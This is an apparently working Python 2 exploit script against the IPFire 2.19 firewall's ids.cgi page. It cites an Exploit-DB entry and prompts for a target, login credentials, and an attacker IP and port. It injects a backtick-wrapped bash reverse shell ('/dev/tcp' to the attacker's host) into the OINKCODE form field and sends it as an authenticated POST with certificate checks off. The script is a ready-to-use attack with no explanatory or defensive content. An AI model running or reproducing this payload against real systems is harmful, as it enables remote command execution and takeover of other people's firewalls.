#!/usr/bin/python2
# 
# Tested on: IPFire 2.19
# Check: https://www.exploit-db.com/exploits/42149
# Inspired by 0x09AL's Poc (https://twitter.com/0x09AL)


import requests


print '''
  ______   ______  __    __  __    __   ______    ______   _______   ________
 /      \ /      |/  \  /  |/  |  /  | /      \  /      \ /       \ /        |
/$$$$$$  |$$$$$$/ $$  \ $$ |$$ | /$$/ /$$$$$$  |/$$$$$$  |$$$$$$$  |$$$$$$$$/
$$ |  $$ |  $$ |  $$$  \$$ |$$ |/$$/  $$ |  $$/ $$ |  $$ |$$ |  $$ |$$ |__
$$ |  $$ |  $$ |  $$$$  $$ |$$  $$<   $$ |      $$ |  $$ |$$ |  $$ |$$    |
$$ |  $$ |  $$ |  $$ $$ $$ |$$$$$  \  $$ |   __ $$ |  $$ |$$ |  $$ |$$$$$/
$$ \__$$ | _$$ |_ $$ |$$$$ |$$ |$$  \ $$ \__/  |$$ \__$$ |$$ |__$$ |$$ |_____
$$    $$/ / $$   |$$ | $$$ |$$ | $$  |$$    $$/ $$    $$/ $$    $$/ $$       |
 $$$$$$/  $$$$$$/ $$/   $$/ $$/   $$/  $$$$$$/   $$$$$$/  $$$$$$$/  $$$$$$$$/

------------
'''

print "Insert your target: "
target = raw_input("Target: ")
url = 'https://' + target + ':444/cgi-bin/ids.cgi'

print "\nInsert here your IP for the reverse shell: "
revhost = raw_input("IP: ")

print "\nNow insert the port that you want for your reverse shell: "
revport = raw_input("Port: ")

print "\nEnter your username: "
username = raw_input("Username: ")

print "\nEnter your password: "
password = raw_input("Password: ")

payload = 'bash -i >& /dev/tcp/' + revhost + '/' + str(revport) + ' 0>&1'
evildata = {'ENABLE_SNORT_GREEN':'on','ENABLE_SNORT':'on','RULES':'registered','OINKCODE': '`id`','ACTION': 'Download new ruleset','ACTION2':'snort'}
headers = {'Accept-Encoding' : 'gzip, deflate, br','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','User-Agent':'IPFIRE Exploit','Referer': url,'Upgrade-Insecure-Requests':'1'}

evildata["OINKCODE"] = '`' + payload + '`'
print "\n[+] Sending Malicious Payload [+]"
req = requests.post(url,data=evildata,headers=headers,auth=(username,password),verify=False)

